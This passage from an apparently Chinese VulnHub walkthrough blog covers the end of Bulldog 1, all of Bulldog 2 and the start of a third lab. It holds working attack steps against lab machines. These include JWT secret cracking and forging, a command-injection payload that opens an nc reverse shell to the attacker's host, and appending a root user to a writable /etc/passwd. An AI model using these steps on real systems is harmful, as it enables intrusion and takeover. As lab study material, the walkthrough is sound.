class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在路径<code>/home/bulldogadmin/</code>下发现隐藏路径<code>.hiddenadmindirectory</code></p><p>进入之后发现两个文件<code>note</code>，<code>customPermissionApp</code></p><p>先将两个文件复制至自己home目录下并更改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp * &#x2F;home&#x2F;django&#x2F;</span><br><span class="line">chmod 700 note customPermissionApp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat note </span><br><span class="line"></span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="line"></span><br><span class="line">It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="line"></span><br><span class="line">Let me know what you think of it!</span><br><span class="line"></span><br><span class="line">-Ashley</span><br></pre></td></tr></table></figure><p>另外一个文件是elf文件，大概对于提权有帮助<br />直接执行则提示需要输入自己的密码，大概在执行<code>sudo su</code></p><p>用strings命令分析一下内容<br />看到一串有意思的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br></pre></td></tr></table></figure><p>可以猜测密码是<code>SUPERultHimatePASHSWORDyouHCANTget</code><br />或<code>SUPERultimatePASSWORDyouCANTget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/yufusec/p/9179625.html">Burp.Intruder</a></p></blockquote><hr /><h1 id="bulldog2"><a class="markdownIt-Anchor" href="#bulldog2"></a> <a href="https://www.vulnhub.com/entry/bulldog-2,246/">bulldog2</a></h1><p><code>2020/02/20 16:35:33</code></p><h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2><p><code>nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.233</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Bulldog.social</span><br><span class="line">MAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 43.190 days (since Tue Jan  7 22:59:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-7"><a class="markdownIt-Anchor" href="#web路径枚举-7"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430)</span><br></pre></td></tr></table></figure><p>dirb扫描路径时没有发现有价值的信息<br />手工登录网页时发现路径<code>/login</code>，<code>/register</code>，<code>/about</code></p><ul><li>路径<code>/</code>下有一些用户评论</li><li>路径<code>/login</code>下存在登录点</li><li>路径<code>/register</code>提示无法注册</li></ul><h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2><ul><li>账户爆破</li></ul><p>构造字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Social</span><br><span class="line">social</span><br><span class="line">Johnathan Abbey</span><br><span class="line">Johnathan</span><br><span class="line">johnathan</span><br><span class="line">Abbey</span><br><span class="line">abbey</span><br><span class="line">Sarah Dubree</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Dubree</span><br><span class="line">dubree</span><br><span class="line">William Katz</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Katz</span><br><span class="line">katz</span><br><span class="line">Winston Churchy</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">network</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">123456</span><br><span class="line">a123456</span><br></pre></td></tr></table></figure><p>使用burpsuite进行爆破，失败</p><ul><li>账户注册</li></ul><p>审计js文件，搜索&quot;register&quot;<br />发现两处与上传有关的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return l.prototype.registerUser &#x3D; function(l) &#123;</span><br><span class="line">                var n &#x3D; new x.Headers;</span><br><span class="line">                return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;),</span><br><span class="line">                this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123;</span><br><span class="line">                    headers: n</span><br><span class="line">                &#125;).map(function(l) &#123;</span><br><span class="line">                    return l.json()</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">l.prototype.onRegisterSubmit &#x3D; function() &#123;</span><br><span class="line">var l &#x3D; this,</span><br><span class="line">n &#x3D; &#123;</span><br><span class="line">        name: this.name,</span><br><span class="line">        email: this.email,</span><br><span class="line">        username: this.username,</span><br><span class="line">        password: this.password</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>猜测可以以POST方式请求路径<code>/users/register</code>，并附带相应格式的json数据即可完成注册</p><p>在burp中构造请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;users&#x2F;register HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.233</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;email&quot;: &quot;abc@abc.abc&quot;,</span><br><span class="line">&quot;username&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;password&quot;: &quot;abc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Thu, 20 Feb 2020 09:32:26 GMT</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用账户<code>abc:abc</code>成功登入</p><p>登入之后发现自己不能执行任何功能，开始垂直提权</p><ul><li>垂直提权</li></ul><p>在登入时发现一次http交互中带有一段json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;standard_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析JWT得到如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>再审计js，查找&quot;auth_level&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.isAdmin&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    var l&#x3D;localStorage.getItem(&quot;user&quot;);</span><br><span class="line">    return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现&quot;master_admin_user&quot;<br />可以尝试修改JWT来尝试提权</p><p>尝试爆破JWT秘钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-cracker</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">chmod +x jwtcrack</span><br><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6</span><br></pre></td></tr></table></figure><p>得到秘钥为&quot;secret&quot;</p><p>修改JWT数据内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>伪造JWT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">    &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39;</span><br></pre></td></tr></table></figure><p>在burp中开启拦截HTTP响应，登出账户并登入，用如下的数据代替身份校验步骤的JWT数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;master_admin_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得admin权限<br />在dashboard发现一个Link+登入点<br />尝试爆破，失败</p><ul><li>报错信息<br />访问路径<code>/%aa</code><br />获得报错信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;&#x2F;%aa&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27)</span><br><span class="line">    at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9)</span><br><span class="line">    at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10)</span><br><span class="line">    at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16)</span><br><span class="line">    at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p>在github上找到&quot;Bulldog-2-The-Reckoning&quot;的源码<br /><a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a></p><p>在<code>/router/users.js</code>中发现存在<code>exec</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">if (error) &#123;</span><br><span class="line">  console.error(&#96;exec error: $&#123;error&#125;&#96;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">console.log(&#96;stderr: $&#123;stderr&#125;&#96;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以在admin中的登入点实现命令注入</p><p>监听端口<br /><code>nc -lvvp 2020</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功接收Shell</p><h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2><p>查看文件<code>/etc/passwd</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;passwd</span><br><span class="line">    -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><code>/etc/passwd</code>可写</p><p>构造账户信息并写入<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su toor</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>JWT</p></blockquote><p>JWT提权时有些迷</p><ul><li>直接修改数据而不修改签名  提权成功</li><li>数据与签名都修改  提权成功</li><li>直接删掉签名部分  提权失败</li></ul><p>jwtcrack破解6位纯小写密码在虚拟机中大概需要3min。</p><p>参考资料</p><blockquote><p><a href="https://www.freebuf.com/vuls/219056.html">JWT</a><br /><a href="https://blog.csdn.net/zyy1659949090/article/details/88176215">/etc/passwd</a><br /><a href="https://blog.blacsheep.cn/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/">WP</a><br /><a href="https://www.anquanke.com/post/id/160755">WP</a></p></blockquote><hr /><h1 id="me-and-my-girlfriend-1"><a class="markdownIt-Anchor" href="#me-and-my-girlfriend-1"></a> <a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">Me-and-My-Girlfriend-1</a></h1><p><code>2020/03/04 13:23:34</code></p><h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.164</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)</span><br><span class="line">|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)</span><br><span class="line">|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)</span><br><span class="line">|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 